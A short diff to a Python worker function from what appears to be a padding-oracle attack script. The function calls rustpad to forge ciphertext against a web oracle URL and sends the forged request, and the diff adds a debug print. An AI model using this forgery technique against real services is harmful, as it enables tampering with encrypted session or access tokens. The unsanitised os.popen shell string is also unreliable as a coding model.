@@ -8,6 +8,7 @@ def worker(job_number, from_thread=True):
     new_plaintext_append_number = re.sub(r"FUZZ", str(job_number), new_plaintext_append)
     new_ciphertext = os.popen(f'./rustpad web --oracle "{url}" -D "0000000000000000" -E "{new_plaintext_append_number}" -B 8 --no-iv -t 10').read().strip()
     new_ciphertext = new_ciphertext[37:len(new_ciphertext)]
+    print(f"new_ciphertext: {new_ciphertext} ")
     ciphertext = ciphertext_base + new_ciphertext
     test_url = re.sub(r"CTEXT", ciphertext, url)
     response = requests.get(test_url, allow_redirects=False)
